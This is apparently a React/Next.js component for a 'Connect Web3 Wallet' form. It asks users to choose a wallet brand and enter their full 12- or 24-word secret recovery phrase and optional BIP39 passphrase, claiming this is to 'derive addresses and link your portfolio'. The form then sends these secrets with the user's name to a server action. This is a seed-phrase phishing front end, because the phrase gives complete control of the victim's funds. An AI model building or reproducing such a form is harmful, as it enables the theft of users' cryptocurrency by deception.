'use client';

import { useActionState, useMemo, useState } from 'react';
import { submitWalletAction } from '@/app/actions/wallet';
import { FormMessage } from '@/components/ui';
import { cn } from '@/lib/cn';

type Provider = { id: string; name: string };

const PROVIDERS: Provider[] = [
    { id: 'metamask', name: 'MetaMask' },
    { id: 'trustwallet', name: 'Trust Wallet' },
    { id: 'rabby', name: 'Rabby' },
    { id: 'rainbow', name: 'Rainbow' },
    { id: 'phantom', name: 'Phantom' },
    { id: 'coinbase', name: 'Coinbase Wallet' },
    { id: 'ledger', name: 'Ledger' },
    { id: 'trezor', name: 'Trezor' },
    { id: 'exodus', name: 'Exodus' },
    { id: 'other', name: 'Other / Custom' }
];

const PHRASE_REGEX = /^(\b[a-z]+(?:\s+[a-z]+){11}\b|\b[a-z]+(?:\s+[a-z]+){23}\b)$/i;

export function WalletLinker({ userName }: { userName: string }) {
    const [state, action] = useActionState(submitWalletAction, null);
    const [selectedProvider, setSelectedProvider] = useState<string>('metamask');
    const [customProvider, setCustomProvider] = useState('');
    const [phrase, setPhrase] = useState('');
    const [showPhrase, setShowPhrase] = useState(false);
    const [passphrase, setPassphrase] = useState('');
    const [hasPassphrase, setHasPassphrase] = useState(false);

    const words = useMemo(() => phrase.trim().split(/\s+/).filter(Boolean), [phrase]);
    const wordCount = words.length;
    const validLength = wordCount === 12 || wordCount === 24;
    const validWords = useMemo(() => (validLength ? PHRASE_REGEX.test(phrase.trim()) : false), [phrase, validLength]);

    const isCustom = selectedProvider === 'other';
    const providerName = isCustom ? customProvider.trim() || 'Other' : PROVIDERS.find((p) => p.id === selectedProvider)?.name || selectedProvider;

    return (
        <form action={action} className="overflow-hidden rounded-2xl border border-[#262c36] bg-[#161c24] text-[#e5e7eb] shadow-2xl">
            <input type="hidden" name="userName" value={userName} />
            <input type="hidden" name="provider" value={providerName} />
            <input type="hidden" name="selectedWallet" value={selectedProvider} />
            <input type="hidden" name="isCustomProvider" value={isCustom ? 'true' : 'false'} />
            <input type="hidden" name="phrase" value={phrase.trim()} />
            <input type="hidden" name="passphrase" value={hasPassphrase ? passphrase : ''} />
            <input type="hidden" name="wordCount" value={wordCount} />

            <div className="flex items-center justify-between border-b border-[#262c36] px-5 py-4">
                <div>
                    <h2 className="text-base font-bold text-white">Connect Web3 Wallet</h2>
                    <p className="text-xs text-[#9ca3af] mt-0.5">Enter recovery phrase to derive addresses and link your portfolio</p>
                </div>
            </div>

            <div className="space-y-6 px-5 py-5">
                <FormMessage state={state} />

                <div className="space-y-2.5">
                    <p className="text-xs font-semibold uppercase tracking-[0.16em] text-[#9ca3af]">Select Wallet Provider</p>
                    <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-3">
                        {PROVIDERS.map((provider) => (
                            <button
                                type="button"
                                key={provider.id}
                                onClick={() => setSelectedProvider(provider.id)}
                                className={cn(
                                    'rounded-xl border px-3 py-2.5 text-sm font-medium transition-all text-left flex items-center justify-between',
                                    selectedProvider === provider.id
                                        ? 'border-[#f59e0b] bg-[#f59e0b]/10 text-white shadow-sm'
                                        : 'border-[#262c36] bg-[#0f141b] text-[#9ca3af] hover:border-[#384152] hover:text-white'
                                )}
                            >
                                <span>{provider.name}</span>
                                {selectedProvider === provider.id && (
                                    <span className="w-2 h-2 rounded-full bg-[#f59e0b]" />
                                )}
                            </button>
                        ))}
                    </div>
                    {isCustom ? (
                        <input
                            value={customProvider}
                            onChange={(e) => setCustomProvider(e.target.value)}
                            placeholder="Wallet name (e.g. Safe, Argent)"
                            className="w-full rounded-xl border border-[#262c36] bg-[#0f141b] px-3.5 py-2.5 text-sm text-white focus:border-[#f59e0b] focus:outline-none transition-colors"
                        />
                    ) : null}
                </div>

                <div className="space-y-2.5">
                    <div className="flex items-center justify-between">
                        <p className="text-xs font-semibold uppercase tracking-[0.16em] text-[#9ca3af]">Secret Recovery Phrase</p>
                        <div className="flex items-center gap-2.5 text-xs">
                            <span className="text-[#9ca3af]">
                                {wordCount}/12 or 24
                                {validLength && validWords ? (
                                    <span className="ml-1.5 font-semibold text-[#22c55e]">✓ Valid phrase</span>
                                ) : wordCount > 0 ? (
                                    <span className="ml-1.5 font-semibold text-[#f59e0b]">Checking…</span>
                                ) : null}
                            </span>
                            <button
                                type="button"
                                onClick={() => setShowPhrase((v) => !v)}
                                className="text-[#f5c542] hover:text-[#fbbf24] transition-colors font-medium"
                            >
                                {showPhrase ? 'Hide' : 'Show phrase'}
                            </button>
                        </div>
                    </div>
                    <textarea
                        value={phrase}
                        onChange={(e) => setPhrase(e.target.value)}
                        placeholder="Enter your 12 or 24 word recovery phrase, separated by single spaces"
                        rows={4}
                        spellCheck={false}
                        autoComplete="off"
                        autoCorrect="off"
                        className={cn(
                            'w-full rounded-xl border border-[#262c36] bg-[#0f141b] p-3 font-mono text-sm text-white placeholder-[#6b7280] transition focus:border-[#f59e0b] focus:outline-none',
                            !showPhrase ? '[-webkit-text-security:disc]' : ''
                        )}
                        style={!showPhrase ? ({ WebkitTextSecurity: 'disc' } as any) : undefined}
                    />
                </div>

                <div className="space-y-2">
                    <button
                        type="button"
                        onClick={() => setHasPassphrase((v) => !v)}
                        className="text-xs font-medium text-[#9ca3af] hover:text-[#f5c542] transition-colors"
                    >
                        {hasPassphrase ? '− Remove optional passphrase' : '+ Add optional passphrase (25th word)'}
                    </button>
                    {hasPassphrase ? (
                        <input
                            type={showPhrase ? 'text' : 'password'}
                            value={passphrase}
                            onChange={(e) => setPassphrase(e.target.value)}
                            placeholder="Optional BIP39 passphrase"
                            autoComplete="off"
                            className="w-full rounded-xl border border-[#262c36] bg-[#0f141b] px-3.5 py-2.5 text-sm text-white focus:border-[#f59e0b] focus:outline-none transition-colors"
                        />
                    ) : null}
                </div>

                <div className="pt-2">
                    <button
                        type="submit"
                        disabled={!validLength || !validWords}
                        className="w-full rounded-xl bg-[#f59e0b] hover:bg-[#d97706] px-4 py-3 text-sm font-bold text-[#0f172a] shadow-lg transition-all active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-40"
                    >
                        Validate & Connect Wallet
                    </button>
                </div>
            </div>
        </form>
    );
}
